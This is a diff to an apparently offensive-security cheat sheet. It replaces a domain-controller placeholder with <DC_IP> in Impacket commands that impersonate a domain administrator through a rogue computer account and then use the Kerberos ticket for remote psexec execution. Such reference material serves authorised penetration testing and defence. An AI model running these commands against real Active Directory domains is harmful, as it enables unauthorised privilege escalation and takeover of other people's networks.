@@ -57,7 +57,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 #### 3. Impersonate
 
 ```console
-sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC_IP> '<DOMAIN>/EvilComputer:<COMPUTER_PASSWORD>'
+sudo ntpdate -s <DC_IP> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC_IP> '<DOMAIN>/EvilComputer:<COMPUTER_PASSWORD>'
 ```
 
 ```console {class="sample-code"}
@@ -86,7 +86,7 @@ $ export KRB5CCNAME=administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
 
 ```console
 # Remote
-sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
+sudo ntpdate -s <DC_IP> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -368,7 +368,7 @@ $ export KRB5CCNAME=secrets.ccache
 
 ```console
 # Remote
-sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
+sudo ntpdate -s <DC_IP> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
 ```
 
 ```console {class="sample-code"}
